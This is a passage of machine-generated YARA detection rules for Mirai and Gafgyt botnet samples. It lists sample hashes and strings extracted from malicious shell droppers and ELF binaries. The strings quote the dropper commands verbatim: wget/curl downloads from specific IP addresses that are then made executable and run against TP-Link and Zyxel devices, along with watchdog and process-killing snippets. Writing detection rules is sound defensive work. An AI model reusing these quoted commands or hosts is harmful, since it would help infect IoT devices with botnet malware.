      $s3 = "wget http://103.176.20.59/skid.arm7 || busybox wget http://103.176.20.59/skid.arm7; chmod 777 skid.arm7; ./skid.arm7 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://103.176.20.59/skid.arm5 || busybox wget http://103.176.20.59/skid.arm5; chmod 777 skid.arm5; ./skid.arm5 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://103.176.20.59/mpsl || busybox wget http://103.176.20.59/mpsl; chmod 777 mpsl; ./mpsl tplinkcat;" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://103.176.20.59/mips || busybox wget http://103.176.20.59/mips; chmod 777 mips; ./mips tplinkcat;" fullword ascii /* score: '16.00'*/
      $s7 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s8 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s14 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s15 = "rm mips mpsl arm* x86" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__d6c69577 {
   meta:
      description = "dropzone - file Mirai(signature)_d6c69577.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d6c69577c33913d97979d098964c0d6278152e832c64f60999abd5b0aeb82c98"
   strings:
      $s1 = "cp /bin/busybox busybox; curl http://103.176.20.59/skid.arm    -o PLXMKJ; chmod 777 PLXMKJ; ./PLXMKJ selfrep.curl" fullword ascii /* score: '24.00'*/
      $s2 = "cp /bin/busybox busybox; curl http://103.176.20.59/mpsl    -o MNCXOP; chmod 777 MNCXOP; ./MNCXOP selfrep.curl" fullword ascii /* score: '21.00'*/
      $s3 = "cp /bin/busybox busybox; curl http://103.176.20.59/skid.arm7    -o YUIOXC; chmod 777 YUIOXC; ./YUIOXC selfrep.curl" fullword ascii /* score: '21.00'*/
      $s4 = "cp /bin/busybox busybox; curl http://103.176.20.59/mips    -o GHJKLB; chmod 777 GHJKLB; ./GHJKLB selfrep.curl" fullword ascii /* score: '21.00'*/
      $s5 = "cp /bin/busybox busybox; curl http://103.176.20.59/skid.arm5    -o WQZRTY; chmod 777 WQZRTY; ./WQZRTY selfrep.curl" fullword ascii /* score: '21.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "/bin/busybox mount -o bind,remount,ro \"$dir\"" fullword ascii /* score: '15.00'*/
      $s8 = "# lol fuck you ducky watch me" fullword ascii /* score: '13.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s13 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__e10641d0 {
   meta:
      description = "dropzone - file Mirai(signature)_e10641d0.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e10641d087374ead3cc638249d0b58082710ba54e99326ebee208b80943ea63a"
   strings:
      $s1 = "wget http://46.23.108.231/arm5 || busybox wget http://46.23.108.231/arm5; chmod 777 arm5; ./arm5 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s2 = "wget http://46.23.108.231/mpsl || busybox wget http://46.23.108.231/mpsl; chmod 777 mpsl; ./mpsl tplinkcat;" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://46.23.108.231/mips || busybox wget http://46.23.108.231/mips; chmod 777 mips; ./mips tplinkcat;" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://46.23.108.231/x86 || busybox wget http://46.23.108.231/x86; chmod 777 arm7; ./x86 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://46.23.108.231/arm7 || busybox wget http://46.23.108.231/arm7; chmod 777 arm7; ./arm7 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://46.23.108.231/arm4 || busybox wget http://46.23.108.231/arm4; chmod 777 arm4; ./arm4 tplinkcat;" fullword ascii /* score: '16.00'*/
      $s7 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s8 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s14 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s15 = "rm mips mpsl arm* x86" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__e4999959 {
   meta:
      description = "dropzone - file Mirai(signature)_e4999959.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e4999959c12cfbb50a7e10ca4e4ede384fa26c26586323c24fbdbae2697774ed"
   strings:
      $s1 = "wget http://103.176.20.59/skid.arm || busybox wget http://103.176.20.59/skid.arm; chmod 777 skid.arm; ./skid.arm massload;" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://103.176.20.59/skid.arm7 || busybox wget http://103.176.20.59/skid.arm7; chmod 777 skid.arm7; ./skid.arm7 massload;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://103.176.20.59/skid.arm5 || busybox wget http://103.176.20.59/skid.arm5; chmod 777 skid.arm5; ./skid.arm5 massload;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://103.176.20.59/mpsl || busybox wget http://103.176.20.59/mpsl; chmod 777 mpsl; ./mpsl massload;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://103.176.20.59/mips || busybox wget http://103.176.20.59/mips; chmod 777 mips; ./mips massload;" fullword ascii /* score: '20.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s11 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s12 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s13 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Ga_gyt_signature__d3b03295 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_d3b03295.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d3b03295103fc12026e27daf37c67083b983fc04ad17a9c87e66324aeca8b3cb"
   strings:
      $s1 = "__stdio_mutex_initializer.3828" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__cd3b6a5d {
   meta:
      description = "dropzone - file Mirai(signature)_cd3b6a5d.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "cd3b6a5d4392242cc662c7afef6cd3753445e837282de24a7da46641d9525e10"
   strings:
      $s1 = "__stdio_mutex_initializer.3828" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Ga_gyt_signature__bf20687c {
   meta:
      description = "dropzone - file Ga-gyt(signature)_bf20687c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bf20687c56bf3d076e3f42e0649e13efc64f3250c9a3442040e2249efcede3c4"
   strings:
      $s1 = "4$3 7 4\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Ct' */
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__534c9f4f {
   meta:
      description = "dropzone - file Mirai(signature)_534c9f4f.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "534c9f4f29fc1893e73e6ed54dbea27a25e269e80e13fbdc2ad29740aa13c535"
   strings:
      $s1 = "4$3 7 4\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Ct' */
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__c944357e {
   meta:
      description = "dropzone - file Mirai(signature)_c944357e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c944357ea4089fd418656ebda19bfde6e905c7faf711136fe585b4fa8ac793f6"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for aarch64" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__97c142b9 {
   meta:
      description = "dropzone - file Mirai(signature)_97c142b9.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "97c142b929e020549f6ef6ca10aa8c07492027918babfb6b4a6178a8a13da1e1"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__de46fcb0 {
   meta:
      description = "dropzone - file Mirai(signature)_de46fcb0.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "de46fcb06b2c63c6eea13ceb025a4310fedff7b54cecd8d0dc7b311964758057"
   strings:
      $s1 = "d__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = ",bad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s3 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__7f94581a {
   meta:
      description = "dropzone - file Mirai(signature)_7f94581a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7f94581a7aa1e955d54f85b961b3294560b79ae2b62a5cb315e3fadb25721eec"
   strings:
      $s1 = "N^NuGET %s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s2 = "(__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s3 = "pbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__a9e23e8f {
   meta:
      description = "dropzone - file Mirai(signature)_a9e23e8f.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a9e23e8f6ee82d0043cf36109ae56ccdd57eba27db749628bbafed0de2f20a4c"
   strings:
      $s1 = "TN^NuGET %s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s2 = "yVGET %s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s3 = "l__get_myaddress: socket" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__0414fc93 {
   meta:
      description = "dropzone - file Mirai(signature)_0414fc93.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0414fc933a732ea6564172b3fe1926974effe72f5c4a1b4fb2af13d8cee9498d"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__5d162eda {
   meta:
      description = "dropzone - file Mirai(signature)_5d162eda.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5d162eda48e6fc7ecf2cc33408f44c5404debe0f06dabc178c23f9641fa50f68"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__76e8938a {
   meta:
      description = "dropzone - file Mirai(signature)_76e8938a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "76e8938a58555924b03dfc826fcf6b3ed2d20ed7f1ec6f61e874ca3cec49fc43"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__82f815f7 {
   meta:
      description = "dropzone - file Mirai(signature)_82f815f7.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "82f815f7f6a7e796b530325e361de4860b6af69ed241fa357f4d18f4462feb46"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__87e7a1fb {
   meta:
      description = "dropzone - file Mirai(signature)_87e7a1fb.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "87e7a1fb8243d3b12a570ee2812aa313b408ff252ecf92184eecf0f02f9ae09f"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__963fde43 {
   meta:
      description = "dropzone - file Mirai(signature)_963fde43.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "963fde4368ba9ae5fda47b6715cae6a085b092e4e9c086abbfedff0d0a1caee4"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__aed15b08 {
   meta:
      description = "dropzone - file Mirai(signature)_aed15b08.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "aed15b08d5b001b03d2c464db31b6a9f9649d54c267268021d10b1b3acbe3b0f"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature_ {
   meta:
      description = "dropzone - file Mirai(signature).sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b667660b93a83995f854d31d089471007af897e85b00f6c57921928f5e99a77b"
   strings:
      $s1 = "wget http://196.251.69.194/kitty.arm; chmod 777 kitty.arm; ./kitty.arm ipcam.tplink; rm kitty.arm" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://196.251.69.194/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 ipcam.tplink; rm kitty.x86" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://196.251.69.194/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 ipcam.tplink; rm kitty.aarch64" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://196.251.69.194/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel ipcam.tplink; rm kitty.mipsel" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://196.251.69.194/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 ipcam.tplink; rm kitty.x86_64" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://196.251.69.194/kitty.mips; chmod 777 kitty.mips; ./kitty.mips ipcam.tplink; rm kitty.mips" fullword ascii /* score: '16.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__53510c97 {
   meta:
      description = "dropzone - file Mirai(signature)_53510c97.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "53510c97e8c75b89a6d4e1e6b38a5a4863b4cbbfad71103b69cc647a42f449ca"
   strings:
      $s1 = "wget http://196.251.69.194/kitty.arm; chmod 777 kitty.arm; ./kitty.arm ipcam.tplink; rm kitty.arm" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://196.251.69.194/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 ipcam.tplink; rm kitty.x86" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://196.251.69.194/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 ipcam.tplink; rm kitty.aarch64" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://196.251.69.194/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel ipcam.tplink; rm kitty.mipsel" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://196.251.69.194/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 ipcam.tplink; rm kitty.x86_64" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://196.251.69.194/kitty.mips; chmod 777 kitty.mips; ./kitty.mips ipcam.tplink; rm kitty.mips" fullword ascii /* score: '16.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__0e6fbbe0 {
   meta:
      description = "dropzone - file Mirai(signature)_0e6fbbe0.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0e6fbbe09430717dd44c4719ccc184a791d0d1f27f5f457fc29d8ac309f54c02"
   strings:
      $s1 = "wget http://196.251.69.194/kitty.arm; chmod 777 kitty.arm; ./kitty.arm router.zyxel; rm kitty.arm" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://196.251.69.194/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 router.zyxel; rm kitty.x86_64" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://196.251.69.194/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel router.zyxel; rm kitty.mipsel" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://196.251.69.194/kitty.mips; chmod 777 kitty.mips; ./kitty.mips router.zyxel; rm kitty.mips" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://196.251.69.194/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 router.zyxel; rm kitty.x86" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://196.251.69.194/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 router.zyxel; rm kitty.aarch64" fullword ascii /* score: '20.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__13bcc2e6 {
   meta:
      description = "dropzone - file Mirai(signature)_13bcc2e6.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "13bcc2e6defd3b38a63800870cc248ce349798244f36698db955501b91cbf86a"
   strings:
      $s1 = "wget http://196.251.84.253/kitty.arm; chmod 777 kitty.arm; ./kitty.arm router.zyxel; rm kitty.arm" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://196.251.84.253/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 router.zyxel; rm kitty.x86_64" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://196.251.84.253/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 router.zyxel; rm kitty.x86" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://196.251.84.253/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 router.zyxel; rm kitty.aarch64" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://196.251.84.253/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel router.zyxel; rm kitty.mipsel" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://196.251.84.253/kitty.mips; chmod 777 kitty.mips; ./kitty.mips router.zyxel; rm kitty.mips" fullword ascii /* score: '20.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__69cb1979 {
   meta:
      description = "dropzone - file Mirai(signature)_69cb1979.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "69cb1979c3db09d9708ddb38236f74f620af90e4f9e9c56a0cbd77e065d7cdd8"
   strings:
      $s1 = "wget http://196.251.69.194/kitty.arm; chmod 777 kitty.arm; ./kitty.arm router.zyxel; rm kitty.arm" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://196.251.69.194/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 router.zyxel; rm kitty.x86_64" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://196.251.69.194/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel router.zyxel; rm kitty.mipsel" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://196.251.69.194/kitty.mips; chmod 777 kitty.mips; ./kitty.mips router.zyxel; rm kitty.mips" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://196.251.69.194/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 router.zyxel; rm kitty.x86" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://196.251.69.194/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 router.zyxel; rm kitty.aarch64" fullword ascii /* score: '20.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__af384db5 {
   meta:
      description = "dropzone - file Mirai(signature)_af384db5.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "af384db55ea2aa72c039c7aa501032396113ca2a82ad8b251281a9a66efa03a1"
   strings:
      $s1 = "wget http://196.251.84.253/kitty.arm; chmod 777 kitty.arm; ./kitty.arm ipcam.tplink; rm kitty.arm" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://196.251.84.253/kitty.mips; chmod 777 kitty.mips; ./kitty.mips ipcam.tplink; rm kitty.mips" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://196.251.84.253/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel ipcam.tplink; rm kitty.mipsel" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://196.251.84.253/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 ipcam.tplink; rm kitty.x86_64" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://196.251.84.253/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 ipcam.tplink; rm kitty.aarch64" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://196.251.84.253/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 ipcam.tplink; rm kitty.x86" fullword ascii /* score: '16.00'*/
      $s7 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__0116c02e {
   meta:
      description = "dropzone - file Mirai(signature)_0116c02e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0116c02eca6948a401ca7051dbd92039dab15135be910f9ebfee9954811380fe"
   strings:
      $s1 = "fake_time" fullword ascii /* score: '9.00'*/
      $s2 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s3 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s4 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s5 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s6 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s7 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s8 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__248b6599 {
   meta:
      description = "dropzone - file Mirai(signature)_248b6599.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "248b6599aebc4e053a68ae502bafc1fec19cc1edcc455a8358e2d3dbe46f0e5e"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__4c9ad5dd {
   meta:
      description = "dropzone - file Mirai(signature)_4c9ad5dd.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4c9ad5dd08179ebfe0f9e8658cc45a48d7aed3bf6ba608c6b9ad9c9224b83b33"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8986d7b4 {
   meta:
      description = "dropzone - file Mirai(signature)_8986d7b4.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8986d7b4843af8e4bf1faebe15b6668640ae3af1edaaa9526ee22b7609f61261"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8ac733a1 {
